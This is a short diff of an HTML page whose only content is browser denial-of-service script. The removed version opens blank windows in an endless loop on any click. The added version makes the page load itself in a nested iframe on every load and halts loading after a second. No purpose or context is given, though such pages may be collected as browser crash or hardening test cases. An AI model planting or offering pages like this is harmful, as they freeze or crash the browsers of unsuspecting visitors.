@@ -1,6 +1,13 @@
 <html>
   <body>
-    <script>window.onload=()=>{document.body.onclick=()=>{var x = window.open('','_blank');while(true){var x = y;var y = window.open('','_blank');x.close();}}}</script>
-    <button>a</button>
+    <script>
+      window.onload=()=>{
+        var f = document.createElement('iframe');
+        f.src = window.location.href;
+        document.body.appendChild(f);
+        setTimeout(window.stop.bind(window),1000);
+      }
+    </script>
+    a
   </body>
 </html>
